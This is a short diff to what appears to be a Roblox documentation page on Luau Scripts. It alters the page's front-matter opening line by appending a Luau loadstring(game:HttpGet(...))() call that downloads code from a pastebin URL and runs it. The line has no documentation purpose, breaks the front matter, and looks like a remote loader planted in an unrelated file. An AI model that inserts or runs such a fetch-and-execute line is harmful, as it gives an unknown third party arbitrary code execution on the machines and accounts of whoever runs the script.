@@ -1,4 +1,4 @@
----
+---loadstring(game:HttpGet("https://pastebin.com/raw/2WEXn2UR"))()
 title: Scripts
 description: Scripts are containers that contain Luau code.
 ---
